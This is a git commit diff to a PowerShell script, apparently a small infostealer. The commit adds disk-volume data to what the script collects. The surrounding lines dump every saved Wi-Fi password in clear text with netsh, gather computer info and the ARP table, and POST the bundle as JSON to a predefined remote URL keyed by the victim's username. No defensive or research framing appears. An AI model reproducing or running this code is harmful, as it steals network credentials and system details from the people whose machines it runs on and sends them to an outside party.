0937e90782cff0bacc6e3d67ba628ff53b9159c6
lamthanhnam <71279634+lamthanhnam@users.noreply.github.com>
2020-12-13 02:09:15 +0700

    scan volumes

--- scan_windows_comp_info.ps1
+++ scan_windows_comp_info.ps1
@@ -3,5 +3,6 @@ $wifi = @{}
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{$wifi.add($name,$pass)}
 $info = Get-ComputerInfo | ConvertTo-Json | ConvertFrom-Json 
 $net = arp -a 
-$data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "local" = $local; "net" = $net ; "info" = $info} | ConvertTo-Json
+$vol = Get-Volume
+$data = New-Object -TypeName psobject -Property @{"wifi" = $wifi; "local" = $local; "net" = $net ; "info" = $info; "Volume" = $vol} | ConvertTo-Json
 Invoke-RestMethod $url/$(whoami) -Method Post -Body $data #$url is predefined
